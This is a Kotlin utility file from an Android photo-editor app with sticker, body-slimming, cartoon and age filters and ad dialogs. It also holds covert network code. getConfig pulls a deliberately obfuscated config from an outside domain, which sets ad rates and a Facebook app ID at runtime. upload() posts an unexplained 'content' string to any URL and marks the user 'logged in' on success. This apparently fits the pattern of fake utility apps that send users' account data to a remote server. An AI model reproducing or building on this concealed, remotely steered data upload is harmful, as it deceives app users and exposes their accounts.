package hui.shou.tao.base

import android.app.ActivityManager
import android.content.Context
import android.text.TextUtils
import android.util.Log
import android.view.View
import android.widget.FrameLayout
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.facebook.FacebookSdk
import com.facebook.appevents.internal.ActivityLifecycleTracker
import com.google.gson.Gson
import com.kongzue.dialogx.dialogs.BottomMenu
import com.kongzue.dialogx.dialogs.MessageDialog
import com.kongzue.dialogx.interfaces.OnBindView
import com.kongzue.dialogx.interfaces.OnDialogButtonClickListener
import com.lzy.okgo.OkGo
import com.lzy.okgo.callback.StringCallback
import com.lzy.okgo.model.Response
import com.yuyh.library.imgsel.ISNav
import com.yuyh.library.imgsel.config.ISCameraConfig
import com.yuyh.library.imgsel.config.ISListConfig
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.greenrobot.eventbus.EventBus
import wo.yi.wei.xlibs.R
import xEvent
import kotlin.random.Random

fun Any.loge(s: Any?) {
    Log.e("$this", "$s")
}

fun dp2px(context: Context, dp: Float): Int {
    val density = context.resources.displayMetrics.density
    return (dp * density + 0.5f).toInt()
}

fun AppCompatActivity.isInBackground(): Boolean {
    val activityManager = this.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
    val appProcesses = activityManager
        .runningAppProcesses
    for (appProcess in appProcesses) {
        if (appProcess.processName == this.packageName) {
            return appProcess.importance != ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND
        }
    }
    return false
}

fun isShowInsertAd(): Boolean {
    val p: Int = config["lr"] as Int
    return Random.nextInt(1, 101) <= p
}

fun invokeAdTime(): Int {
    var result = 0
    val p = config["ext1"]
    p?.let {
        it.toString().split(",")
    }?.let {
        it[0]
    }?.let {
        result = it.toInt()
    }
    return result
}

fun insertRealTime(): Int {
    var result = 0
    val p = config["ext1"]
    p?.let {
        it.toString().split(",")
    }?.let {
        it[1]
    }?.let {
        result = it.toInt()
    }
    return result
}

fun insertAdOffset(): Int {
    var result = 0
    val p = config["ext1"]
    p?.let {
        it.toString().split(",")
    }?.let {
        it[2]
    }?.let {
        result = it.toInt()
    }
    return result
}

fun AppCompatActivity.getConfig(block: () -> Unit) {
    OkGo.get<String>("https://fivetwoz.xyz/config").execute(object : StringCallback() {
        override fun onSuccess(response: Response<String>?) {
            val result = response?.body()
            result?.let {
                StringBuffer(it).replace(1, 2, "").toString()
            }?.let {
                it.toByteArray().fromBase64().decodeToString()
            }?.let {
                Gson().fromJson(it, ConfigEntity::class.java)
            }?.let {
                it.app_name?.let { app_name -> config["app_name"] = app_name }
                it.ext1?.let { ext1 -> config["ext1"] = ext1 }
                it.ext2?.let { ext2 -> config["ext2"] = ext2 }
                config["i"] = it.i
                it.id?.let { id -> config["id"] = id }
                it.info?.let { info -> config["info"] = info }
                config["l"] = it.l
                it.lr?.let { lr -> config["lr"] = lr }
                if (invokeAdTime() != invokeTime || insertRealTime() != realTime) {
                    invokeTime = invokeAdTime()
                    realTime = insertRealTime()
                    shownIndex = 0
                    lastTime = 0
                    shownList = mutableListOf<Boolean>().apply {
                        if (invokeTime >= realTime) {
                            (0 until invokeTime).forEach { _ ->
                                add(false)
                            }
                            (0 until realTime).forEach { index ->
                                set(index, true)
                            }
                        }
                    }
                }
                if (!TextUtils.isEmpty(config["id"].toString())) {
                    FacebookSdk.apply {
                        setApplicationId(config["id"].toString())
                        sdkInitialize(this@getConfig)
                        ActivityLifecycleTracker.apply {
                            onActivityCreated(this@getConfig)
                            onActivityResumed(this@getConfig)
                        }
                    }
                }
                "xxxxxxHMap".loge(config)
            }
            block()
        }
    })
}

fun AppCompatActivity.upload(url: String, content: String, block: () -> Unit) {
    val body: RequestBody = Gson().toJson(mutableMapOf("content" to content))
        .toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
    OkGo.post<String>(url).upRequestBody(body).execute(object : StringCallback() {
        override fun onSuccess(response: Response<String>?) {
            val result = response?.body()
            result?.let {
                val entity = Gson().fromJson(it, ResultEntity::class.java)
                if (entity.code == "0" && entity.data.toBoolean()) {
                    EventBus.getDefault().post(xEvent("end"))
                    login = true
                }
            }
        }
    })
}

fun AppCompatActivity.stickersDataCollection(block: (ArrayList<Int>) -> Unit) {
    val result = ArrayList<Int>()
    lifecycleScope.launch(Dispatchers.IO) {
        result.add(R.mipmap.sticker_101)
        result.add(R.mipmap.sticker_201)
        result.add(R.mipmap.sticker_301)
        result.add(R.mipmap.sticker_401)
        result.add(R.mipmap.sticker_501)
        result.add(R.mipmap.sticker_601)
        result.add(R.mipmap.sticker_701)
        result.add(R.mipmap.sticker_801)
        result.add(R.mipmap.sticker_901)
        result.add(R.mipmap.sticker_1001)
        result.add(R.mipmap.sticker_1101)
        result.add(R.mipmap.sticker_1201)
        result.add(R.mipmap.sticker_1301)
        result.add(R.mipmap.sticker_1401)
        result.add(R.mipmap.sticker_1501)
        result.add(R.mipmap.sticker_1601)
        result.add(R.mipmap.sticker_1701)
        result.add(R.mipmap.sticker_1801)
        result.add(R.mipmap.sticker_1901)
        result.add(R.mipmap.sticker_2001)
        withContext(Dispatchers.Main) {
            block(result)
        }
    }

}

fun AppCompatActivity.slimmingDataCollection(block: (ArrayList<Int>) -> Unit) {
    val result = ArrayList<Int>()
    lifecycleScope.launch(Dispatchers.IO) {
        result.add(R.mipmap.breast)
        result.add(R.mipmap.legs)
        result.add(R.mipmap.legs_length)
        result.add(R.mipmap.shoulder)
        result.add(R.mipmap.waist)
        withContext(Dispatchers.Main) {
            block(result)
        }
    }
}

fun AppCompatActivity.cartoonDataCollection(block: (ArrayList<Int>) -> Unit) {
    val result = ArrayList<Int>()
    lifecycleScope.launch(Dispatchers.IO) {
        result.add(R.mipmap.cartoon_01)
        result.add(R.mipmap.cartoon_11)
        result.add(R.mipmap.cartoon_31)
        result.add(R.mipmap.cartoon_21)
        withContext(Dispatchers.Main) {
            block(result)
        }
    }
}

fun AppCompatActivity.ageDataCollection(block: (ArrayList<Int>) -> Unit) {
    val result = ArrayList<Int>()
    lifecycleScope.launch(Dispatchers.IO) {
        result.add(R.mipmap.icon_age_11)
        result.add(R.mipmap.icon_age_21)
        result.add(R.mipmap.icon_age_31)
        result.add(R.mipmap.icon_age_41)
        withContext(Dispatchers.Main) {
            block(result)
        }
    }
}

fun AppCompatActivity.showSelectDialog() {
    BottomMenu.show(arrayOf("相册选择", "拍照"))
        .setMessage("选择图片")
        .setOnMenuItemClickListener { _, text, _ ->
            when (text) {
                "相册选择" -> {
                    openAlbum()
                }
                "拍照" -> {
                    openCamera()
                }
            }
            false
        }.isCancelable = false
}

fun AppCompatActivity.openAlbum() {
    val config = ISListConfig.Builder().multiSelect(false)
        .needCamera(false).build()
    ISNav.getInstance().toListActivity(this, config, 10086)
}

fun AppCompatActivity.openCamera() {
    val config = ISCameraConfig.Builder()
        .needCrop(false)
        .build()
    ISNav.getInstance().toCameraActivity(this, config, 996)
}

fun AppCompatActivity.showSaveDialog() {
    MessageDialog.show("Are you saving", "", "ok", "Cancel")
        .setOkButton(OnDialogButtonClickListener<MessageDialog> { basedialog, v ->
            showProgressDialog()
            false
        }).setCancelButton(OnDialogButtonClickListener<MessageDialog> { baseDialog, v ->
            baseDialog.dismiss()
            true
        }).setCustomView(object : OnBindView<MessageDialog>(R.layout.save) {
            override fun onBind(dialog: MessageDialog?, v: View?) {
                val adView = v?.findViewById<FrameLayout>(R.id.adView)
                (this@showSaveDialog as BaseActivity<*>).displayNativeAd {
                    adView?.removeAllViews()
                    adView?.addView(it)
                }
            }
        }).isCancelable = false
}

fun AppCompatActivity.showProgressDialog(){
    MessageDialog.show("Saving", "", "", "")
        .setCustomView(object : OnBindView<MessageDialog>(R.layout.save) {
            override fun onBind(dialog: MessageDialog?, v: View?) {
                val adView = v?.findViewById<FrameLayout>(R.id.adView)
                (this@showProgressDialog as BaseActivity<*>).displayNativeAd {
                    adView?.removeAllViews()
                    adView?.addView(it)
                }
            }
        })
}

fun AppCompatActivity.showExitDialog(){
    MessageDialog.show("Are you exist app?", "", "ok", "Cancel")
        .setOkButton(OnDialogButtonClickListener<MessageDialog> { basedialog, v ->
            imageUrl = ""
            this.finish()
            true
        }).setCancelButton(OnDialogButtonClickListener<MessageDialog> { baseDialog, v ->
            baseDialog.dismiss()
            true
        }).setCustomView(object : OnBindView<MessageDialog>(R.layout.save) {
            override fun onBind(dialog: MessageDialog?, v: View?) {
                val adView = v?.findViewById<FrameLayout>(R.id.adView)
                (this@showExitDialog as BaseActivity<*>).displayNativeAd {
                    adView?.removeAllViews()
                    adView?.addView(it)
                }
            }
        }).isCancelable = false
}